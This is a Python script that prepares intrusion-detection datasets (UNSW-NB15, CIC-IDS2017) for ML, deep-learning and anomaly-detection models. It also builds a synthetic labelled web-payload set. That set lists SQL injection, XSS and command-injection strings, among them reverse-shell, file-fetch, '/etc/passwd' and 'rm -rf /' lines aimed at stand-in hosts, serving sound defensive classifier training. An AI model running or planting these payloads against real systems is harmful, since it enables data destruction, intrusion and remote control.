"""
IDRS Data Preparation Script
Downloads and prepares datasets for all parts of the pipeline.
"""

import os
import pandas as pd
import numpy as np
from pathlib import Path
from huggingface_hub import hf_hub_download, snapshot_download
from tqdm import tqdm
import warnings
warnings.filterwarnings('ignore')

# Configuration
BASE_DIR = Path(".")
DATA_DIR = BASE_DIR / "data"
OUTPUT_DIR = BASE_DIR / "outputs"
CIC_DIR = DATA_DIR / "cicids2017"
UNSW_DIR = DATA_DIR / "unsw_nb15"

# Create directories
for d in [DATA_DIR, OUTPUT_DIR, CIC_DIR, UNSW_DIR]:
    d.mkdir(parents=True, exist_ok=True)


def download_dataset(dataset, subsets=None, files=None, use_cache=True):
    """
    Download datasets from HuggingFace.

    Parameters:
    -----------
    dataset : str
        'UNSW-NB15' or 'CIC-IDS2017'
    subsets : list or str
        Subsets to download: ['Network-Flows', 'Packet-Fields', 'Packet-Bytes', 'Payload-Bytes']
        or 'all'
    files : list or str
        File numbers to download (1-18) or 'all'
    """
    if subsets == 'all':
        subsets = ['Network-Flows', 'Packet-Fields', 'Packet-Bytes', 'Payload-Bytes']
    elif isinstance(subsets, str):
        subsets = [subsets]

    if files == 'all':
        files = list(range(1, 19))
    elif isinstance(files, (int, str)):
        files = [files]

    if dataset == 'UNSW-NB15':
        flow_file = "UNSW_Flow"
    else:
        flow_file = "CICIDS_Flow"

    print(f"\n Downloading {dataset}...")
    print(f"   Subsets: {subsets}")
    print(f"   Files: {files}")

    # Download each subset
    for subset in tqdm(subsets, desc=f"Downloading {dataset}"):
        if subset == 'Network-Flows':
            hf_hub_download(
                repo_id=f"rdpahalavan/{dataset}",
                subfolder=subset,
                filename=f"{flow_file}.parquet",
                repo_type="dataset",
                local_dir=dataset,
                local_dir_use_symlinks=use_cache
            )
        else:
            for file in files:
                hf_hub_download(
                    repo_id=f"rdpahalavan/{dataset}",
                    subfolder=subset,
                    filename=f"{subset.replace('-', '_')}_File_{file}.parquet",
                    repo_type="dataset",
                    local_dir=dataset,
                    local_dir_use_symlinks=use_cache
                )
    print(f"✅ {dataset} download complete")


def merge_dataset(dataset, subsets=None, files=None, max_samples_per_file=None):
    """
    Merge multiple subsets and files into a single DataFrame.

    Parameters:
    -----------
    dataset : str
        'UNSW-NB15' or 'CIC-IDS2017'
    subsets : list
        Subsets to merge
    files : list
        File numbers to merge
    max_samples_per_file : int or None
        Maximum samples to take from each file (for memory efficiency)
    """
    if subsets is None:
        subsets = ['Network-Flows', 'Packet-Fields']
    if files is None:
        files = list(range(1, 19))

    on_columns = ['packet_id', 'flow_id', 'source_ip', 'source_port',
                  'destination_ip', 'destination_port', 'protocol', 'attack_label']

    if dataset == 'UNSW-NB15':
        flow_file = "UNSW_Flow"
    else:
        flow_file = "CICIDS_Flow"

    print(f"\n[MERGE] Merging {dataset} data...")
    print(f"   Subsets: {subsets}")
    print(f"   Files: {files}")

    # Load flow data
    if 'Network-Flows' in subsets:
        flow_df = pd.read_parquet(f"{dataset}/Network-Flows/{flow_file}.parquet")
        flow_cols_to_keep = ['flow_id', 'flow_duration', 'flow_byts_s', 'flow_pkts_s',
                            'fwd_pkts_tot', 'bwd_pkts_tot', 'fwd_byts_tot', 'bwd_byts_tot',
                            'fwd_pkt_len_max', 'fwd_pkt_len_min', 'fwd_pkt_len_mean', 'fwd_pkt_len_std',
                            'bwd_pkt_len_max', 'bwd_pkt_len_min', 'bwd_pkt_len_mean', 'bwd_pkt_len_std',
                            'flow_iat_mean', 'flow_iat_std', 'flow_iat_max', 'flow_iat_min',
                            'fwd_iat_tot', 'fwd_iat_mean', 'fwd_iat_std', 'fwd_iat_max', 'fwd_iat_min',
                            'bwd_iat_tot', 'bwd_iat_mean', 'bwd_iat_std', 'bwd_iat_max', 'bwd_iat_min',
                            'fwd_header_len', 'bwd_header_len', 'fwd_seg_siz_min',
                            'init_win_bytes_forward', 'init_win_bytes_backward',
                            'active_mean', 'active_std', 'active_max', 'active_min',
                            'idle_mean', 'idle_std', 'idle_max', 'idle_min',
                            'ece_flag_count', 'cwr_flag_count', 'ece_flag_count', 'urg_flag_count',
                            'ack_flag_count', 'psh_flag_count', 'rst_flag_count', 'syn_flag_count',
                            'fin_flag_count']
        # Keep only columns that exist
        flow_cols_exist = [c for c in flow_cols_to_keep if c in flow_df.columns]
        flow_df = flow_df[flow_cols_exist]

    all_dfs = []

    for file in tqdm(files, desc="Processing files"):
        file_dfs = []

        for sub in subsets:
            if sub == 'Network-Flows':
                continue

            filename = f"{sub.replace('-', '_')}_File_{file}.parquet"
            try:
                df = pd.read_parquet(f"{dataset}/{sub}/{filename}")
                file_dfs.append(df)
            except Exception as e:
                print(f"   Warning: Could not load {filename}: {e}")

        if not file_dfs:
            continue

        # Merge subsets for this file
        if len(file_dfs) > 1:
            merged = file_dfs[0]
            for df in file_dfs[1:]:
                # Find common columns for merging
                common_on = [c for c in on_columns if c in merged.columns and c in df.columns]
                if common_on:
                    merged = merged.merge(df, how='inner', on=common_on)
                else:
                    # Concatenate if no common merge keys
                    merged = pd.concat([merged, df], axis=1)
        else:
            merged = file_dfs[0]

        # Merge with flow data
        if 'Network-Flows' in subsets and 'flow_id' in merged.columns:
            merged = merged.merge(flow_df, how='inner', on='flow_id')

        # Sample if needed
        if max_samples_per_file and len(merged) > max_samples_per_file:
            merged = merged.sample(n=max_samples_per_file, random_state=42)

        all_dfs.append(merged)

    # Combine all files
    if not all_dfs:
        print("[WARNING]️ No data loaded!")
        return None

    print(f"   Combining {len(all_dfs)} file DataFrames...")
    combined = pd.concat(all_dfs, ignore_index=True)

    print(f"✅ Merged dataset: {combined.shape[0]:,} rows × {combined.shape[1]} columns")
    return combined


def prepare_classical_ml_data(dataset='UNSW-NB15', sample_frac=0.1, files=None):
    """
    Prepare data for Classical ML (Parts 1 & 2).
    Downloads, merges, and returns feature matrix and labels.

    Parameters:
    -----------
    dataset : str
        'UNSW-NB15' or 'CIC-IDS2017'
    sample_frac : float
        Fraction of data to sample (for memory efficiency)
    files : list
        File numbers to use

    Returns:
    --------
    X : DataFrame - Feature matrix
    y : Series - Labels
    df : DataFrame - Full dataframe with labels
    """
    print(f"\n[TARGET] Preparing Classical ML data for {dataset}...")

    # Download required subsets
    if dataset == 'UNSW-NB15':
        if files is None:
            files = [1, 2, 10, 11, 12]  # Files with attack data
    else:
        if files is None:
            files = [1, 2, 3, 4, 5, 6, 7, 8, 9]

    # Download Network-Flows and Packet-Fields
    download_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)

    # Merge
    df = merge_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)

    if df is None:
        raise ValueError(f"Failed to load {dataset} data")

    # Sample if needed
    if sample_frac < 1.0:
        df = df.sample(frac=sample_frac, random_state=42)
        print(f"   Sampled {sample_frac*100}%: {len(df):,} rows")

    # Get label column
    label_col = 'attack_label'
    if label_col not in df.columns:
        # Try alternative label columns
        for col in ['label', 'attack_cat', 'Label']:
            if col in df.columns:
                label_col = col
                break

    # Get feature columns (exclude label and ID columns)
    exclude_cols = ['packet_id', 'flow_id', 'source_ip', 'destination_ip',
                    'attack_label', 'label', 'attack_cat', 'Label']
    feature_cols = [c for c in df.columns if c not in exclude_cols]

    # Keep only numeric columns for features
    numeric_cols = df[feature_cols].select_dtypes(include=[np.number]).columns.tolist()

    X = df[numeric_cols].copy()
    y = df[label_col].copy()

    # Clean data
    X = X.replace([np.inf, -np.inf], np.nan)
    X = X.fillna(X.median())

    print(f"✅ Classical ML data ready:")
    print(f"   Features: {X.shape[1]}")
    print(f"   Samples: {X.shape[0]:,}")
    print(f"   Classes: {y.nunique()}")

    return X, y, df


def prepare_deep_learning_data(dataset='UNSW-NB15', sample_frac=0.05, files=None):
    """
    Prepare data for Deep Learning (Part 3).
    Returns sequence-ready data.
    """
    print(f"\n[BRAIN] Preparing Deep Learning data for {dataset}...")

    if files is None:
        if dataset == 'UNSW-NB15':
            files = [1, 2, 10]
        else:
            files = [1, 2, 3]

    # Download more features including bytes
    download_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)

    df = merge_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)

    if df is None:
        raise ValueError(f"Failed to load {dataset} data")

    if sample_frac < 1.0:
        df = df.sample(frac=sample_frac, random_state=42)

    # Get label
    label_col = 'attack_label' if 'attack_label' in df.columns else 'label'

    # Get features - use subset most relevant for DL
    exclude_cols = ['packet_id', 'flow_id', 'source_ip', 'destination_ip',
                    'attack_label', 'label', 'attack_cat']
    feature_cols = [c for c in df.columns if c not in exclude_cols]
    numeric_cols = df[feature_cols].select_dtypes(include=[np.number]).columns.tolist()

    # Select top features for DL (most discriminative)
    top_features = [
        'flow_duration', 'flow_byts_s', 'flow_pkts_s',
        'fwd_pkts_tot', 'bwd_pkts_tot', 'fwd_byts_tot', 'bwd_byts_tot',
        'fwd_pkt_len_mean', 'bwd_pkt_len_mean',
        'flow_iat_mean', 'flow_iat_std',
        'fwd_iat_mean', 'bwd_iat_mean',
        'init_win_bytes_forward', 'init_win_bytes_backward',
        'syn_flag_count', 'ack_flag_count', 'rst_flag_count',
    ]
    dl_features = [f for f in top_features if f in numeric_cols]

    X = df[dl_features].copy()
    y = df[label_col].copy()

    # Clean
    X = X.replace([np.inf, -np.inf], np.nan)
    X = X.fillna(X.median())

    print(f"✅ Deep Learning data ready:")
    print(f"   Features: {len(dl_features)}")
    print(f"   Samples: {X.shape[0]:,}")

    return X, y, df


def prepare_anomaly_detection_data(dataset='UNSW-NB15', sample_frac=0.05, files=None):
    """
    Prepare data for Anomaly Detection (Part 4).
    Uses only normal traffic for training.
    """
    print(f"\n[SEARCH] Preparing Anomaly Detection data for {dataset}...")

    if files is None:
        if dataset == 'UNSW-NB15':
            files = [1, 2]
        else:
            files = [1, 2]

    download_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)
    df = merge_dataset(dataset, subsets=['Network-Flows', 'Packet-Fields'], files=files)

    if df is None:
        raise ValueError(f"Failed to load {dataset} data")

    if sample_frac < 1.0:
        df = df.sample(frac=sample_frac, random_state=42)

    label_col = 'attack_label' if 'attack_label' in df.columns else 'label'

    # Filter to only normal traffic for training
    normal_mask = df[label_col].astype(str).str.lower().str.contains('normal|benign', na=False)
    normal_df = df[normal_mask].copy()
    anomaly_df = df[~normal_mask].copy()

    print(f"   Normal samples: {len(normal_df):,}")
    print(f"   Anomaly samples: {len(anomaly_df):,}")

    # Get features
    exclude_cols = ['packet_id', 'flow_id', 'source_ip', 'destination_ip',
                    'attack_label', 'label', 'attack_cat']
    feature_cols = [c for c in df.columns if c not in exclude_cols]
    numeric_cols = df[feature_cols].select_dtypes(include=[np.number]).columns.tolist()

    X_normal = normal_df[numeric_cols].copy()
    X_normal = X_normal.replace([np.inf, -np.inf], np.nan).fillna(X_normal.median())

    X_anomaly = anomaly_df[numeric_cols].copy() if len(anomaly_df) > 0 else None
    if X_anomaly is not None:
        X_anomaly = X_anomaly.replace([np.inf, -np.inf], np.nan).fillna(X_normal.median())

    print(f"✅ Anomaly Detection data ready:")
    print(f"   Training features: {X_normal.shape[1]}")
    print(f"   Normal samples: {X_normal.shape[0]:,}")

    return X_normal, X_anomaly, normal_df, anomaly_df


def prepare_web_payload_data():
    """
    Prepare data for LLM/Web Threat Classification (Part 5).
    Creates a synthetic payload dataset for SQLi, XSS, etc.
    """
    print(f"\n[WEB] Preparing Web Payload data...")

    # Create synthetic web payload dataset
    payloads = []
    labels = []

    # SQL Injection patterns
    sqli_patterns = [
        "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
        "1' AND '1'='1", "1 UNION SELECT NULL--",
        "admin'--", "' OR 'x'='x", "1' AND SLEEP(5)--",
        "<script>alert('xss')</script>", "'; EXEC xp_cmdshell--",
    ]

    # XSS patterns
    xss_patterns = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "javascript:alert(1)",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "'-alert(1)-'", "<script>eval(atob('YWxlcnQoMSk='))</script>",
    ]

    # Command Injection
    cmd_patterns = [
        "; ls -la", "| cat /etc/passwd", "`whoami`",
        "$(whoami)", "| ping -c 3 attacker.com", "; rm -rf /",
        "| wget http://evil.com/shell.sh", "| nc -e /bin/sh attacker.com",
    ]

    # CSRF
    csrf_patterns = [
        "<img src=http://evil.com/track.gif>",
        "<form action=http://evil.com method=POST>",
        "<iframe src=http://evil.com style=display:none>",
    ]

    # Benign
    benign_patterns = [
        "Hello World", "user@example.com", "password123",
        "search query", "https://example.com/page",
        "username=test&password=test123",
        "GET /index.html HTTP/1.1", "Mozilla/5.0 (Windows NT 10.0)",
    ]

    # Generate samples
    np.random.seed(42)

    for _ in range(500):
        payloads.append(np.random.choice(sqli_patterns))
        labels.append('SQLi')

    for _ in range(500):
        payloads.append(np.random.choice(xss_patterns))
        labels.append('XSS')

    for _ in range(300):
        payloads.append(np.random.choice(cmd_patterns))
        labels.append('CommandInjection')

    for _ in range(200):
        payloads.append(np.random.choice(csrf_patterns))
        labels.append('CSRF')

    for _ in range(1000):
        payloads.append(np.random.choice(benign_patterns))
        labels.append('Benign')

    # Add some variations
    for _ in range(200):
        base = np.random.choice(sqli_patterns)
        payloads.append(base + " " + np.random.choice(benign_patterns))
        labels.append('SQLi')

    for _ in range(200):
        base = np.random.choice(xss_patterns)
        payloads.append(base + " " + np.random.choice(benign_patterns))
        labels.append('XSS')

    df = pd.DataFrame({
        'payload': payloads,
        'label': labels
    })

    print(f"✅ Web Payload data ready:")
    print(f"   Total samples: {len(df)}")
    print(f"   Classes: {df['label'].value_counts().to_dict()}")

    return df


def save_dataset_info():
    """Save dataset metadata for reference."""
    info = {
        'UNSW-NB15': {
            'description': 'UNSW-NB15 network intrusion dataset',
            'files': 18,
            'subsets': ['Network-Flows', 'Packet-Fields', 'Packet-Bytes', 'Payload-Bytes'],
            'source': 'https://research.unsw.edu.au/projects/unsw-nb15-dataset'
        },
        'CIC-IDS2017': {
            'description': 'CIC-IDS2017 network intrusion dataset',
            'files': 18,
            'subsets': ['Network-Flows', 'Packet-Fields', 'Packet-Bytes', 'Payload-Bytes'],
            'source': 'https://www.unb.ca/cic/datasets/ids-2017.html'
        }
    }

    with open(OUTPUT_DIR / 'dataset_info.json', 'w') as f:
        import json
        json.dump(info, f, indent=2)

    print(f"\n[SAVE] Dataset info saved to {OUTPUT_DIR / 'dataset_info.json'}")


# Main execution
if __name__ == "__main__":
    print("=" * 60)
    print("IDRS Data Preparation Script")
    print("=" * 60)

    # Step 1: Save dataset info
    save_dataset_info()

    # Step 2: Prepare Classical ML data (most important - needed for Parts 1 & 2)
    print("\n" + "=" * 60)
    print(" STEP 1: Classical ML Data (Parts 1 & 2)")
    print("=" * 60)
    X_ml, y_ml, df_ml = prepare_classical_ml_data(
        dataset='UNSW-NB15',
        sample_frac=0.1,
        files=[1, 2, 10, 11, 12]
    )

    # Save processed data
    ml_data_path = OUTPUT_DIR / 'classical_ml_data.parquet'
    df_ml.to_parquet(ml_data_path, index=False, compression='snappy')
    print(f"[SAVE] Saved to {ml_data_path}")

    # Step 3: Also prepare CIC-IDS2017 for comparison
    print("\n" + "=" * 60)
    print(" STEP 2: Classical ML Data - CIC-IDS2017")
    print("=" * 60)
    try:
        X_cic, y_cic, df_cic = prepare_classical_ml_data(
            dataset='CIC-IDS2017',
            sample_frac=0.1,
            files=[1, 2, 3, 4, 5]
        )
        cic_data_path = OUTPUT_DIR / 'cicids_ml_data.parquet'
        df_cic.to_parquet(cic_data_path, index=False, compression='snappy')
        print(f"[SAVE] Saved to {cic_data_path}")
    except Exception as e:
        print(f"[WARNING]️ CIC-IDS2017 preparation failed: {e}")

    # Step 4: Prepare Deep Learning data
    print("\n" + "=" * 60)
    print(" STEP 3: Deep Learning Data (Part 3)")
    print("=" * 60)
    try:
        X_dl, y_dl, df_dl = prepare_deep_learning_data(
            dataset='UNSW-NB15',
            sample_frac=0.05,
            files=[1, 2]
        )
        dl_data_path = OUTPUT_DIR / 'deep_learning_data.parquet'
        df_dl.to_parquet(dl_data_path, index=False, compression='snappy')
        print(f"[SAVE] Saved to {dl_data_path}")
    except Exception as e:
        print(f"[WARNING]️ Deep Learning data preparation failed: {e}")

    # Step 5: Prepare Anomaly Detection data
    print("\n" + "=" * 60)
    print(" STEP 4: Anomaly Detection Data (Part 4)")
    print("=" * 60)
    try:
        X_normal, X_anomaly, normal_df, anomaly_df = prepare_anomaly_detection_data(
            dataset='UNSW-NB15',
            sample_frac=0.05,
            files=[1, 2]
        )
        anomaly_data_path = OUTPUT_DIR / 'anomaly_detection_data.parquet'
        normal_df.to_parquet(anomaly_data_path, index=False, compression='snappy')
        print(f"[SAVE] Saved to {anomaly_data_path}")
    except Exception as e:
        print(f"[WARNING]️ Anomaly Detection data preparation failed: {e}")

    # Step 6: Prepare Web Payload data
    print("\n" + "=" * 60)
    print(" STEP 5: Web Payload Data (Part 5)")
    print("=" * 60)
    try:
        df_payload = prepare_web_payload_data()
        payload_data_path = OUTPUT_DIR / 'web_payload_data.parquet'
        df_payload.to_parquet(payload_data_path, index=False, compression='snappy')
        print(f"[SAVE] Saved to {payload_data_path}")
    except Exception as e:
        print(f"[WARNING]️ Web Payload data preparation failed: {e}")

    print("\n" + "=" * 60)
    print("✅ ALL DATA PREPARATION COMPLETE!")
    print("=" * 60)
    print("\n Output files:")
    for f in OUTPUT_DIR.glob("*.parquet"):
        print(f"   • {f.name} ({f.stat().st_size/1024/1024:.2f} MB)")